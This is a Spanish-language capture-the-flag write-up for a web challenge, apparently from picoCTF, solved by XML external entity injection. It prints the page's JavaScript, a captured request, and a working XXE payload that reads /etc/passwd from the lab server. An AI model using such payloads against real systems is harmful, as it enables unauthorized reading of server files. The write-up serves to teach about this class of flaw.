
## Descripcion

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

## Hints

XML external entity Injection

## Solucion

Lo primero que tenemos que hacer es hacer un analisis a la pagina. No hay mucho para encontrar, si buscamos en el codigo fuente encontramos lo siguiente:

```
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}
```

```
document.querySelectorAll('.detailForm').forEach(item => {
    item.addEventListener("submit", function(e) {
        checkDetails(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
});
function checkDetails(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : "Could not find the details. Better luck next time :("
            )
            .then(res => document.getElementById("detailsResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

Procedo abrir burpsuite y comienzo a interceptar. Hago click en `detalles` para recibir la peticion. Analizamos la peticion para armar el payload:

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:60199
Content-Length: 61
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:60199
Referer: http://saturn.picoctf.net:60199/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>

```

Armamos el payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>

```

![[images/flagSOAP.png]]
## Referencias
